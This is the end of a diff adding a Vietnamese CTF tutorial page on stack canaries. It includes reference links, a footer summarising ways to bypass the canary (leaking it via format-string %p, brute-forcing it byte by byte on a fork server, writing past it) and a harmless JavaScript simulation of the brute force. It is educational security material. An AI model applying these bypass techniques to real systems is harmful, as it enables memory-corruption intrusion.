+    <li>Nền: <a href="stack_overflow.html">stack_overflow</a>. Leak: <a href="leak_techniques.html">leak_techniques</a> · <a href="fmtstr.html">fmtstr</a>. Brute: <a href="partial_overwrite.html">partial_overwrite</a> (cùng ý tưởng oracle).</li>
+    <li>"StackGuard" paper · gcc -fstack-protector docs.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 2 · Bài 14.</strong> Canary (fs:0x28, byte thấp 00) chặn overflow tuyến tính. Vượt: leak (fmt/%p) rồi ghi lại, brute (fork server), hoặc ghi thẳng không qua canary. Tiếp theo: partial overwrite.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("can-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("can-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var SECRET=[0x00,0x3b,0x9f,0x2c,0x1e,0x4d,0x55,0x6a];
+  var found=[];
+  var bytesEl=document.getElementById("bytes"),msg=document.getElementById("msg");
+  function render(){
+    bytesEl.innerHTML=SECRET.map(function(b,i){
+      if(i<found.length)return '<div class="b found">'+found[i].toString(16).padStart(2,"0")+'</div>';
+      return '<div class="b">??</div>';
+    }).join("");
+  }
+  document.getElementById("autob").addEventListener("click",function(){
+    var tries=0;
+    while(found.length<8){var pos=found.length;for(var b=0;b<256;b++){tries++;if(b===SECRET[pos]){found.push(b);break;}}}
+    render();
+    msg.innerHTML='<span style="color:var(--ok);font-weight:700">⟳ Xong sau '+tries+' probe.</span> canary = '+found.map(function(b){return b.toString(16).padStart(2,"0");}).join(" ")+' (byte đầu 00). → dùng p64(canary) trong overflow.';
+  });
+  document.getElementById("resetb").addEventListener("click",function(){found=[];render();msg.textContent="Byte 0 luôn = 00. Mỗi byte thử ≤256 lần.";});
+  render();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
